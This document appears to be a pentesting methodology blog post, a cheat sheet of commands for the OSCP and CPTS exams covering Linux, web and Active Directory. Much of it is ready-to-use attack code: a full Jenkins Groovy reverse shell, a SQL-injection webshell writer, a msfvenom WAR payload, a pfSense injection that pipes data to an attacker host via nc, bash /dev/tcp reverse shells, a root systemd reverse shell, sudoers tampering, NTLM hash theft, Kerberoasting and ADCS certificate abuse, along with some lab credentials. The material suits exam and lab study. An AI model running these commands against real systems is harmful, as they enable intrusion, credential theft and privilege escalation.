---
title: "OSCP / CPTS Methodology"
date: 2026-04-28 00:00:00 +0000
categories: [Methodology & Cheat Sheets]
tags: [OSCP, CPTS, Methodology, Cheat Sheet, Active Directory, Pentesting]
toc: true
---

## Checklist : 

### Linux :

- **Before having access :**
- **Do nmap scan .**
- **If you dont find a web app , just know the path is an outdated Service .**
- **always check versions first , if we find web :**
- **Find Directories + subdomains + files .**
- **If you find Tomcat , there is a way to Pentest it Down there .**
- **check version inside web side found as well .**
- **If we find a login page = try Auth bypass via SQL Injection .**
- **Find parameter inside the URL : LFI + SQLi .**
- **Check if you find an Upload Page , try different File Upload Bypasses .**
- **If you find Node-ExpressJS check for /Graphql , maybe it can lead to a SQLI .**
- **Once inside :**
- **Stabilize Shell First**
- **Check Quick wins on Cheat Sheet .**
- **Always Check the Files that we can run as root or another user and modify them to a revshell if we can .**
- **Run Linpeas if we find nothing .**
- **Check Priv esc for different CMS .**
- **Check If we find a git directory (gitea or smt similar)**
- **Check the var/www directory for internal websites .**
- **Check the Privesc Section Below (Way more detailed)**
- **After Root :**
- **Check the shadow file and root folder for important files , maybe some creds , crack the shadow file , you will need the passwd + shadow = unshadow then John .**
 

## Enumeration :

### Scanning :

```bash
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN Open_Ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN Nmap_sV_sC_Results.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN Nmap_Vuln_Results.txt 
rustscan -a $Intra --ulimit 5000 -- -sC -sV -Pn | tee Intra_scan
nmap --script vuln -p Ports $target 
sudo nmap 10.129.2.0/24 -sn 
sudo nmap -sL 172.16.1.0/24
fping -a -g 172.16.0.0/16 2>/dev/null

```

```jsx
ftp> ls
229 Entering Extended Passive Mode (|||5417|)
ftp> passive off
This will fix it . 
```

### Services :

**FTP :** 

```bash
#Brute Force :
hydra -t64 -L ../Wordlist/users -P ../Wordlist/passwd ftp://172.16.1.101
auxiliary/scanner/ftp/ftp_login 
set PASS_FILE passwords.txt
set USER_FILE users.txt
set RHOSTS 172.16.1.101
run
# Issues : 
ftp> ls
229 Entering Extended Passive Mode (|||5417|)
ftp> passive off
This will fix it . 
```

## Web Application :

### Crawling :

```bash
burpsuite : it will automatically crawl all the application for us 

Target / Site map . 
```

### subdomains + directories :

```java
gobuster -w wordlist -u https://IP -K -x txt,html,php...

dirsearch -u http://10.10.10.20 : BETTERRRR 
```

```bash
gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
```

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.thetoppers.htb" -u http://10.129.200.71 
```

```bash
gobuster dir -u http://10.129.85.12 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -x php,xml,html -r --exclude-length X 
ffuf -u http://conversor.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
```

### AWS Commands :

> In case we found AWS S3 buckets , we can interact with them .
> 

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls : List all s3 buckets . 
```

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb : List content of as s3
```

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb : File upload
```

### Jenkins Rev Shell :

```bash
Go to Script Console : 

String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Wordpress :

Enumeration : 

```jsx
sudo wpscan --url http://10.10.110.100:65000/wordpress/ --enumerate    
sudo wpscan --password-attack wp-login -t 20 -U james -P passwd --url "http://10.10.110.100:65000/wordpress"

```

**RCE Pannel :** 

```jsx
Select a theme : Twenty Nineteen 
Add the Revshell inside the 404.php . 
Visit : http://10.10.110.100:65000/wordpress/wp-content/themes/twentynineteen/404.php
```

**Privilege Escalation :** 

```bash
always navigate to the /var/www/html/wordpress/config.php . 
Or : /var/www/html/wordpress/wp-config.php
su james : change to the user found when brute forcing the Login to wp-admin . 
```

**Got Creds for Data Base :** 

```sql
mysql -u username -p password 
show databases ; 
use wordpress;
show tables ; 
select * from wp_users ; 
```

**Persistence :** 

```jsx
Always check the SSH Keys for easy access . 
```

### Command Injection :

```bash
https://github.com/payloadbox/command-injection-payload-list
Use this whenever we have a parametere that gets used with a command . 
```

### File Upload :

```bash
Always check for Extensions that are allowed , try php5 , phtml , ... 
/usr/share/webshells/ : Then check the one for the Technology used . 
```

### SQL Injection :

```bash
# Via GraphQL : 
http://IP:3000/graphql?query={USER{username}} : This is a GraphQL query Example . 

# Via SQLmap : 
sqlmap -r req --batch : this will auto answer . 
sqlmap -r req -batch --dbs : List Databases . 
sqlmap -r req -D Support --tables : List Tables from a DB . 
sqlmap -r req -D Support -T staff --dump : Dump all information from the Table . 

# Manual Injection : Inject these and see if the webserver returns an error or a change .
====> Testing if it exists . 
http://IP:80/room.php?code=2' : 'This will try and trigger the SQLi. 
http://IP:80/room.php?code=2'-- - : 'This will trigger it as well . 

====> How many Collumns . 
http://IP:80/room.php?code=2 order by 5 : This will check the collumn number . 
We should keep trying this one until , we get an error , if we do get it at 8 , then 
the number of collumns is 7 . 

====> Using Union Select : 
+ http://IP:80/room.php?code=2 union select 1,2,3,4,5,6,7 .
This will confirm it and retun to us where we can inject or use DB command , For example 
say we write this , and we get on the screen 1 ,3 , 5 ,6 ; this means we can replace 
those numbers with our DB query .
+ http://IP:80/room.php?code=2 union select database(),2,3,4,5,6,7 
+ http://IP:80/room.php?code=2 union select database(),2,user(),4,5,6,7 
+ http://IP:80/room.php?code=2 union select 1,2,3,load_file('/etc/passwd') ,5,6,7 

====> File Upload via SQLI : '<?php system($_REQUEST["exec"]);?>' into outfile '/var/www/html/Shell.php'
+ http://IP:80/room.php?code=2 union select 1,2,3,'<?php system($_REQUEST["exec"]);?>',5,6,7 into outfile '/var/www/html/Shell.php'
Now we just navigae to IP:80/Shell.php?exec=command : to execute the commands .   
```

### LFI / RFI :

**Testing For LFI :** 

```bash
ffuf -u 'http://IP/index.php?view=FUZZ' -w /usr/share/FUZZING/LFI/LFI-JHADIX.TXT 

we can always try some bypasses like :
=..//..//..//..//..// 
we can also use PHP Filters : 
/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//etc/passwd 

# LFI on Wordpress : 

http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```

**Testing For RFI :** 

```bash
If you find LFI on Windows always test for RFI : 

Responder -I tun0 -A : For analyzing . 

http://IP/index.php?view=//IP/Share
http://IP/index.php?view=\\IP\Share  
```

**Beyond Path Traversal :** 

```powershell
Say we found a path traversal due to a param or an exploit . 
/../../../../../../../../../../../../windows/win.ini : We can check to see this file 
c:\Windows\System32\Drivers\etc\hosts : We can also try reading this to confirm the vuln.
Now if we can read files , always think about reading Files inside of the users folders .

```

### Login Page :

**Auth Bypass via SQL Injection :** 

```bash
https://github.com/austinsonger/SQL-Injection-Authentication-Bypass-Cheat-Sheet
```

### Apache Tomcat :

```bash
auxiliary(scanner/http/tomcat_mgr_login) : This will give us the creds to login
# Once logged in we can Upload a webshell in a WAR format using MSFvenom . 
http://10.129.157.228:8080/manager/html : Here is the login page . 
# Generate the Rev Shell : 
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.15.59 LPORT=4443 -f war -o rev.war
# Upload it and you can click on it in the applciation section . 
```

## Cracking Files/Hashes :

```bash

****** Files ******
 
===> XSLX : 

office2john file.xlsx > file.john 
john --wordlist=/X file.john . 

====> PFX: 

pfx2john File.pfx > Hash 

====> ZIP : 

zip2john File.zip > Hash 

====> GPG : 

gpg2john File.gpg > Hash 
gpg -d credentials.gpg

if it has a Key : 
gpg2john Key.asc > ForJohn . 
gpg --import Key.asc . 
gpg --decrypt File.gpg . 

******* JOHN THE RIPPER QUICK CRACKING GUIDE ******

# PREPARE HASHES DUMPED FROM LINUX FOR JOHN
unshadow /etc/passwd /etc/shadow > hashes.txt

# DICTIONARY CRACKING sha512crypt HASHES WITH rockyou.txt
john --wordlist=rockyou.txt --format=sha512crypt hashes.txt

# DICTIONARY CRACKING MD5 HASHES WITH rockyou.txt
john --format=Raw-MD5 --wordlist=rockyou.txt hashes.txt

# DICTIONARY CRACKING NTLM HASHES WITH rockyou.txt
john --format=NT --wordlist=rockyou.txt hashes.txt

# Cracking Shadow file : 
 unshadow pass shadow > unshadow
john --wordlist=/usr/share/wordlists/rockyou.txt --rules --format=md5crypt-long unshadow


***** Active Directory Hashcracking: ******

# DCC2 Hashes mode :
hashcat -m 2100 Helly.DC02 /usr/share/wordlists/rockyou.txt

# TGS with AES 128 :
hashcat -m 19700 hashesss /usr/share/wordlists/rockyou.txt

***** Cracking RULES ******

==> If rockyou doesn't work , Always use Hashcat rules before generating custom Wordlists :
hashcat -r /usr/share/hashcat/rules/best66.rule

```


## Some Services : 

### PFSense :

```bash
Username : can be anything 
Password : pfsense 
If we try to brute force and we get banned , we can use proxychains with socks5 to bypass
the ban . 
# If we have 2.1.4
use exploit/unix/http/pfsense_graph_injection_exec

#Command injection via Burp : 
?status_rrd_graph_img.php?database=queues;find+${HOME}|nc+10.10.10.5+9001
Now on our machine we do : nc -lnvp 9001 > filesystem.txt 
This will output the command result from the find command onto the filesystem.txt file . 
#The ${HOME} is just a / since the / is banned , we used that to bypass it 
Since we did env command  from earlier and we go that $HOME is / . 

```

### SMB Exploitation :

```bash
search ms17-010
exploit/windows/smb/ms17_010_eternalblue : SMB v1
exploit/windows/smb/ms17_010_psexec : SMB v2
```

## Post Exploitation :

### Shell Stabilizer :

```bash
which python
python3 -c 'import pty;pty.spawn("/bin/bash")'
background 
stty raw -echo; fg
export TERM=xterm
```
```bash
==> Using script instead of Python :
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
export TERM=xterm
PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$'
```
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
ssty -a : this will give us the rows and columns . 
background
stty raw -echo; fg
stty rows number_of_rows cols number_of_columns  
export TERM=xterm-256color 
PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$'

Or : PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$ '

```

### Pivoting / Tunneling :

Finding different subnets : 

```bash
arp -a . 
ip route . 
nmap -v -sn 10.10.10.0/24 --open . 
```

**Via SSH :** 

```bash
# SSH Local Port Forwarding : 
ssh -L 4444:127.0.0.1:8443 user@IP : 
Bind Local 4444 with the 8443 port on the remote Host , in this case it was the same one
127.0.0.1 and IP we re doing the SSH to .
ssh -L 4444:Remote_machine_on_private_network:8443 user@IP : Bind 4444 locally to 8443 . 
ssh -L 8000:internal:80 -L 8443:internal:443 -L 4444:internal:4444 -N -f user@pivot

# Dynamic Port Forwarding : 
ssh -D 1080 -N -f user@pivot.example.com
N and f are just to tell it to fork it in the background and not execute any command .

#Using sshutle : 
sshuttle -r user@pivot.example.com 10.129.83.0/24 : Route all subdomains 
# or route all traffic:
sshuttle -r user@pivot.example.com 0/0 : route all traffic . 
```

**Using Chisel :** 

```bash
# https://github.com/jpillora/chisel/releases/tag/v1.10.1 : amd64.gz . 

===> On attacking Host : 

./chisel server -p 8081 --reverse . (add & to allow it to run in the background jobs )  

===> On Windows Host : 

./chisel.exe client  KALIIP:8081 R:socks (Add & if u want ) . 

===> Now move to /etc/proxychains and use socks5 for the 1080 that we got . 

Now we can use proxychains and we will reach any remote port locally on our local port .

proxychains -q command : Quiet mode .  
```

```bash
With a Browser , We need to configure foxyproxy and add a new one for port 1080 on our
localhost , put Socks5 and this way we can access the remote port 8000 locally on 
localhost:8000 . 
```

**Using Ligolo :** 

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up  

# Launch ligolo server from kali with self signed certs : 
sudo ligolo-proxy -selfcert 
	
# From the victim machine : 
./agent -connect <Attack IP>:11601 -ignore-cert

# Tunnel Steup : First select our session : From Ligolo : 
session  
1
+++ After selecting the session (in this case 1)  
ifconfig 
# From the terminal : 
sudo ip route add <Internal_Network> dev ligolo
start 

# Multiple Tunnels : 

sudo ip tuntap add user kali mode tun ligoloo 
sudo ip link set ligoloo up 

# If we want to switch the Tunnel route :
sudo ip route replace 192.168.98.0/24 dev ligolo

Session 
2
ifconfig 
# On kali 
sudo ip route add 172.16.2.0/24 dev ligoloo
# On Ligolo 
start --tun ligoloo

# Delete a TUN : 
ip tuntap del dev ligoloo mode tun

# Add only one Host from another Pivot (for exmaple only accessible from DC03) : 
sudo ip route add 172.16.2.101/32 dev ligoloX

```

## Linux Priv Escalation :

### Quick Wins :

```bash
id : Check for Groups and Which user . 
cat /etc/passwd : Check other users on the machine . 
sudo -l : which prog can be ran with root perm . 
uname -sr / lsb_relase -a : Version + architecture .  
find / -type f -perm -04000 -ls 2>/dev/null : Find binaries with SUID . 
Check for Bash History . 
If we can Write into a file and execute it as anOTher user , always put a RevShell there .
If you get Creds always test for password Reuse . 
cat /etc/fstab : if there is an nfs . 
sudo -V : check sudo version for privesc . 

# Kenrel PrivEsc : 
uname -a : Check the kernel version and check if it has privesc vectors . 

# SUID Binaries : 

We see that there is an added s into who can RWX on that file or executable which makes
it an SUID , now if we can execute a rev shell with that SUID , it will always give us a
root shell . There are a lot of legit SUID binaries that we can't exploit but if we find
an unusual one , we should look into it .  

find / -type f -perm -04000 -ls 2>/dev/null

# Check Browsers available , if Firefox is there : use Firefox Decryptor : 
https://github.com/unode/firefox_decrypt 

=====> Not that Quick : 

# Services : 

ps aux | grep -i root : search for services running under root perms . 

# Open Ports : 

ss -lntu 
ss -ltu : to resolve the name of services . 

# ConJobs : 

cat /etc/crontab 
ls /etc/cron* 
cat /etc/cron*  

# Files : check files owned by A group : 
groups 
find / -group name 2/>dev/null . 
find / -writable -type d -group name 2>/dev/null 
find / -writable -type f -group name 2>/dev/null 

# Files Owned by a User : 
id 
find / -writable -type d -user name 2>/dev/null
find / -writable -type f -user name 2>/dev/null

# If we have User www-data may run the following commands on box:
# (scriptmanager : scriptmanager) NOPASSWD: ALL

sudo -u scriptmanager /bin/bash

# Capabilites : 

getcap -r / 2>/dev/null : CHeck Capabilites . 

# Reboot : 

If we have W access to a file owned by root , and we put a RevShell then execute it , we
get access as the user who executed the file , but if we reboot the system , the service
will first get executed by the root user . 

We can make the bash an SUID binary , and since root will start the service , it will 
execute the command that allows bash to become an SUID binary and that way , we can get
root : 

/usr/bin/chmod +s /bin/bash . 

Once this is executed , we should get a rool shell by running : 

/usr/bin/bash -p . (GTFOBINS) 

```

### Processes Abuse :

```bash
wget http://10.10.14.139/pspy
./pspy 
# Look for UID=0  ===> those are ran by Root . 
```

### Python script abuse :

```bash
If a Python script that is ran by root calls a library that doesn''t exist , we can 
create a file named as that library and the program will call the library that exists
on the same directory before moving to the rest , here is an example : 

cat /home/frankfile.py 

import call
import urllib
....'
echo 'import os; os.system("chmod +s /bin/bash")' > /home/frank/call.py
or :
nano call.py  
# /home/frank/call.py
import os
os.system("bash -i >& /dev/tcp/YOUR_IP/4444 0>&1")
```

### Path Abuse :

```bash
If we have an SUID that executes bunch of binaries inside of a script , if the binary 
executed doesn't have the full path specified , we can create another binary with the 
same name and put a RevShell inside of it , then once we do that we can modify the PATH 
variable so that when the system wants to execute that binary it will execute the newly
created one and not the legitimate one . 

# Example : 

===> Say we have an SUID that executes this : 

cp /home/backup /backup/backupsss

===> We can create a file called cp and put our revshell on it . 

echo "RevShellPayload" > cp 

===> Now we can modify the path , to start with our directory before it searches other 
directories for that binary . 

export PATH=/tmp:$PATH

Now it will start searching our /tmp folder before the /usr/bin which means if we execute
cp we get our RevShell executed Now all we need to do is execute our SUID binary and 
inside of it , it will execute our cp binary .   
```

### LinPeas.exe :

```bash
# carlospolop privilege-escalation-awesome-scripts-suite/tree/master/linPEAS . 

./linpeas.exe . 
```

### Searching for Passwords :

```bash
grep -ri "password"
grep -riE "connect|.*connect|connect.*"
```

### Vulnerable SUID / Binaries :

```bash
Bash : bash -p : SUID 

Fail2ban : # https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/

Fail2ban-Client : SUDO : 

sudo /usr/bin/fail2ban-client status 

sudo /usr/bin/fail2ban-client get <JAIL> actions 

sudo /usr/bin/fail2ban-client set <JAIL> addactions evil  

sudo /usr/bin/fail2ban-client set mbilling_ddos action evil  actionban "chmod +s /bin/bash"

sudo /usr/bin/fail2ban-client set mbilling_ddos  banip 1.2.3.4 
```

```powershell

# Reboot : 

If we have Reboot as root , think about modifying a service ran by root and then reboot
the machine to be able to execute it , heere is an example : 

[edward@zeno home]$ cat /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/sh -c 'echo "edward ALL=(root) NOPASSWD: ALL" > /etc/sudoers'

[Install]
WantedBy=multi-user.target

Now if we inject our payload to modify our user to be able to have ALL sudo perms , 
we can get root easly once ce reoot it . 
```

```bash
# Systsemctl 
If it s an SUID , we can abuse it to create a service that will be executing a reverse
shell to our machine , but as ROOT . 

Firt create this file , and move it to the victim machine . $TF is just the file in env.

[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.59/9999 0>&1'

[Install]
WantedBy=multi-user.target

/bin/systemctl enable /dev/shm/rot.service 
/bin/systemctl start rot 

#  (ALL, !root) /bin/bash
sudo -u#-1 /bin/bash : we can bypass it by doing this. 
```

### Git :

```bash
If we find a .git file always read them , we might find creds there . 
We found Creds for Gitea login , we read the code , see if we can modify it .
See if we can modify the file or executable it executes as root or smt like that . 
```

### Credential Harvesting :

```bash
# Firefox : 
If we find firefox installed , we can either decrypt the profile and get passwords 
Or we can use SQLite to access to the History , Navigate to 
cat /home/privilege/.mozilla/firefox/profiles.ini 
/home/<Username>/.mozilla/firefox/xxxx.default
sqlite3 places.sqlite 'SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 30;'

```

## Active Directory :

### Check List :

- Scan All TCP Ports : Check The useful note Down for more info .
- Check ldap , rpc , smb with anonymous access . Check for Public Shares .
- Find Usernames :
Find usernames in Web Site and generate a Username List maybe .
if you get access , Look for usernames using netexec , --rid-brute , --users and enumdomuser with RPC client .
- Check usernames found with kerbrute .  
- Search for ASREP Roastable Users .
- Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
- Try to authenticate using every protocol .
- Enumerate shares with those Users found . Use netexec to download .
- Check Certipy for Vulnerable Templates . 
- If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
- If we can't privesc , we can move to Blood Hound .

### Still Stuck ?

- **Check for executables that exist on shares or applications .**
- **On a Local machine if nothing gives any value check the programs installed for a Priv Esc vector . (On Program Files after C:\).**
- **Check for Executables that you can reverse engineer maybe for some credentials .**

### Multiple Domains :

- **Always run nxc on all IPs to get the computer names , identify servers and DCs then add them to the hostfile.**
- **Always Check the Network interfaces on every machine that we get access to to check for internal networks, do a ping Sweep from the compromised machine(Specially the DC in Cross Domain)**
- **Import the agent for Ligolo and route the trafic .**
- **Check Kerberos related files , we can use klist to get the TGT to impersonate users (check Kerberos Section in Post Exploitation)**

### Additional Tips :

- **If you compromise a Web admin always upload a webshell to get execute commands as the webserver (might have SE Impersonate)**
- **Found Write Privileges on a Share , upload an INK file to steal Hashes (more details in share section)**
- **If we find a WMI file , extract it locally and try getting the DPAPI encrypted Creds (More details in WMI/DPAPI section)**

### Without Credentials :

#### Enumerating DNS :

```bash
dnsrecon -d Domain -n $target : Scan for dns . 

dig DomainName @IP axfr : Zone transfer .

# Adding Hostnames to /etc/hosts :

nxc smb $target -u '' -p '' --generate-hosts-file hosts

```

#### Enumerating RPC :

```bash
rpcclient -U "" -N $target . 

enumdomusers . 
```

#### Enumerating NFS :

```bash
# This is found on book.hacktricks.wiki 

nmap -sV -script=nfs-shomount $target -v 

showmount -e $target : It will list all mounted shares . 

mkdir /tmp/mntfolder  : folder to store the file we will be mounting . 

mount -t nfs '[-o vers=2]' $target:/users(name of the drive to mount) /tmp/mnt/folder . 

# On ZSH : 

 sudo mount -t nfs -o vers=3,nolock 10.10.9.11:/users mnt/userss/

```

#### Enumerating Web :

```bash
gobuster dir -u http://$target -w /usr/share/seclists/raft-large-directories -t 50 -o gb_dirs.txt . 

gobuster dir -u http://$target -w /usr
```

#### Enumerating LDAP :

```bash
nmap -n -sV --script "ldap* and not brute" -p 389 $target : Enumerate LDAP with anon.

ldapsearch -x -H ldap://$target -D 'Username@DomainName' -w 'Password' -b 'DC=Fusion,DC=HTB' | tee ldapdump

ldapdomaindump $target -u 'support.htb\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' :
#Same as the ldap search but it will return it in an HTML format and in a higher level.
===> First check Users.html , for more info like Descriptions check .Json format .
===> Look for something like Info , description , SamAccountName and check if u find smt.  
```

#### Null Session :

```bash
netexec smb $target : Find Domain Name to add it to /etc/hosts . 

netexec smb $target -u '' -p '' : Test anonymous access . 

netexec smb $target -u '' -p '' --users : Generate a list of users . 

nxc smb $target -u '' -p '' --users | awk '{print $5}' : Users Only .

nxc smb $target -u '' -p '' --users | awk '{print $5}' | grep -vE '^\[|^-|^$' | tee users.txt : users Only as well . 

netexec smb $target -u 'guest' -p '' --users : Generate a list of users . 

impacket-lookupsid 'guest'@$target 

netexec smb $target -u '' -p '' --rid-brute 

```

#### Brute Force :

```bash

netexec smb $target -u userlist.txt -p 'PasswordFound' --continue-on-success | tee brute.txt 

netexec rdp $target -u userlist.txt -p 'PasswordFound' --continue-on-success | tee brute.txt : Check if we can access via RDP . 

```

```bash
Brute force With FFUF : For the -d ; we can get it from inspecting the Network Tab or 
BurpSuite Request .... This is using FUFF thought the proxychains . here we already used
chisel and forwarded local port 8080 on the remote machine onto our 8080 . 

ffuf -u 'http://127.0.0.1:8080' -w /usr/share/wordlist/rockyou.txt -d 'username=root&password=FUZZ&submit=sign+in' -X "POST" -x socks5://127.0.0.1:1080 -H "Content-Type: application/x-www-form-urlencoded" -fc 401 -r 

```

#### Username Generation :

```bash
#https://raw.githubusercontent.com/mohinparamasivam/AD-Username-Generator/refs/heads/master/username-generate.py

python3 username-generator.py -u username.txt -o genrated_username.txt  
```

#### Kerbrute :

```bash
kerbrute userenum generated_usernames.txt --dc $target -d Domain

kerbrute userenum /usr/share/Usernames/Names/names.txt --dc $target -d Domain
```

### With Credentials :

#### Generating Users :

```bash
netexec smb $target -u 'Username' -p 'Password' --rid-brute : Generate a list of users .

netexec smb $target -u 'Username' -p 'Password' --rid-brute  | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f 2 | tee users.txt 

nxc smb Anomaly-DC.anomaly.hsm -u 'Brandon_Boyd' -k --use-kcache --rid-brute : Using Kerberos Ticket . 

```

#### ASREP Roasting :

```bash
impacket-GetNPUsers  htb.local/ -dc-ip $target -usersfile users.txt -outputfile Hashes.txt
impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -format hashcat -outputfile asreproast.txt -dc-ip 10.10.10.10

# Crack them .

Jhon : --format=krb5asrep 

Hashcat Mode : 18200
```

#### Kerberoasting :

```bash
#Method 1: 

impacket-GetUserSPNs -dc-ip $target 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -request -outputfile hash

====> Sometimes we need to sync with the server time : 

timedatectl set-ntp off . 

rdate -n $Target . 

====> Crack it : 

john --wordlist=/wordlists  Hash .

# Method 2 : 

this will check kerberoastable users using netexec . 

netexec ldap $target -u 'users_list.txt' -p '' -k --asreproast asrep.txt . 

```

```bash
setspn -T medin -Q */* : Find kerberoastable Users . 

Rubeus.exe kerberoast /outfile:hashes.txt 

Rubeus.exe asreproast /outfile:hashes.txt 
```

#### Testing All Protocols :

```bash
netexec smb $target -u 'username' -p 'Password'

netexec smb $target -u 'username' -p 'Password' --users | awk '{print$ 5}' | fgrep -v '[*]' | tee users2
netexec rdp $target -u 'username' -p 'Password'

netexec winrm $target -u 'username' -p 'Password'
```

#### Shares :

**Enumerating Shares :** 

```bash
smbclient -L \\\\IP\\ -N : Null Session Shares . 

smbclient -U username "\\\\IP\\Share" : Access a specific share . 

netexec smb $target -u 'username' -p 'password' --shares -M spider_plus -o DOWNLOAD_FLAG=True : downnload everything . 

netexec smb $target -u 'username' -p 'password' --shares --spider ShareName -regex . 

====> Exclude something : 

nxc smb $target -u 'username' -p 'password' --shares -M spider_plus -o "DOWNLOAD_FLAG=True OUTPUT_FOLDER .,EXCLUDE_FILTER='PRINT$','IPC$','SYSVOL','NETLOGON'" 
nxc smb $target -u 't-skid' -p 'tj072889*' --shares -M spider_plus -o "DOWNLOAD_FLAG=True,OUTPUT_FOLDER=.,EXCLUDE_FILTER='PRINT$','IPC$','SYSVOL','NETLOGON'"

Check for non default shares first , inside those check for non default apps or smt like
that , check the date of last modifications to be sure of which one to check first .

====> Download ALL from SMB 
recurse on 
prompt off
mget *

**Writable Shares :**

If we can write into a share always upload a INK file and setup responder , we might be able to capture some Hashes .
https://github.com/Greenwolf/ntlm_theft
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft
python3 ntlm_theft.py --generate modern --server tun0 --filename "Please_Clickit"    

==> If this doesn't work , this is a recent CVE :
https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC

==> There is also a module in NXC for this :
nxc smb $target -u 'clerk.john' -p 'clerkhill' -M slinky -o NAME=Final_test SERVER=10.200.62.83

```

**Share To RCE :** 

```bash
If we can Write into a Share , we can upload a .LNK , or .txt or some other extensions 
and from there use Responder to catch the Call back if we get a call back to our machine
we then crack the NetNTLMV2 hash . 

Link : github/GreenWolf/ntlm_Theft : Install it locally and start putting these files 
into the shares . 

**To generate the Malicious Payloads :** 

python3 ntlm_tehft.py -g all -s KALI_IP -f Directory_To_Store_Malicious_Files 

**To upload them :** 

smbclient //IP/Share
put FileName . 

**Upload a WebShell :** 

If we have acess the Web Share , we can uplaod a Shell and navigate into it . 
****
```

#### Certification Abuse :

```bash
Here we are looking for a vulenrability in the certificate assignment on the domain , 
if we run the tool it will give us a list of templates that are missconfigured , 
if we look at the Enrollment Rights , those are the users that can modify a that cert and create one for any user they want , and impersonate whoever they want , if our user is one of them , we can abuse it . 

Check certipy wiki for more info about how to abuse it . 

===> certipy-ad find -u 'Username' -p 'Password' -dc-ip $target -vulnerable .

==> certipy-ad find -target 'Anomaly-DC.anomaly.hsm' -u 'Brandon_Boyd@anomaly.hsm' -k -no-pass -dc-ip $target -vulnerable -stdout

===> certipy-ad find -u 'Username' -hashes :NTLMHash -dc-ip $target -stdout -vulnerable . 

===> We then create the cert : ca = CA Name , -target = CA DNS Name , -template = Name of the vulnerable template . 
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'UserTemplate' \
    -upn 'Administrator@corp.local' 

===> Authenticate with this cert : 

certipy auth -pfx 'administrator.pfx' -dc-ip '$target'

this will return the Hash of our user requested . 

# Enumerating Cert :

certipy-ad find -u 'Username' -p 'Password' -dc-ip $target -text -output certs 

This will return all the templates whether they are vulnerable or not .
Here we will get all the Groups that can manipulate the Cert templates , 
of course we re looking for unusual Groups . 

cat -n certs | grep -iC4 'enrollment rights' | grep -viE "Enterprise Admins|Domain Admins|Domain Controllers" | fgrep -i '\' 

n : for numbers / grep for Enrollment rights to see who can do what with this template .  / Remove Admins Groups , to see unusual groups . / E is for Regex which means all of the things mentionned in one . 

Say the unusual thing is Domain/operator_ca . on line 54 , 
we can go check the user and see if we can get access to that user , 
then once we do , we can use certipy with -vulnerable to be able to get the ESC number ,
and from there we can go and check how to abuse it . 

# ESC1 :

1/ Get the Admin SID :
certipy-ad  account -u 'SVC_CA' -p 'Weak123@' -dc-ip 10.1.240.197 -user 'administrator' read

2/ Request the Certificate :

Standard : 
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'VulnTemplate' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
Eg:

certipy-ad req \
    -u 'SVC_CA@Welcome.local' -p 'Weak123@' \   
    -dc-ip $target -target 'DC01.WELCOME.local' \
    -ca 'WELCOME-CA' -template 'Welcome-Template' \
    -upn 'administrator@welcome.local' -sid 'S-1-5-21-141921413-1529318470-1830575104-500' 

3/ Authenticate using the certificate :
certipy auth -pfx 'administrator.pfx' -dc-ip $target

# Admin Password Expired :

==> Suppose we get the admin.pfx , but when we try to generate our TGT we can't due to the fact that the Admin password is expired , we can attempt an LDAP Shell and try resetting the Admin Password to something else .
Eg :
certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target
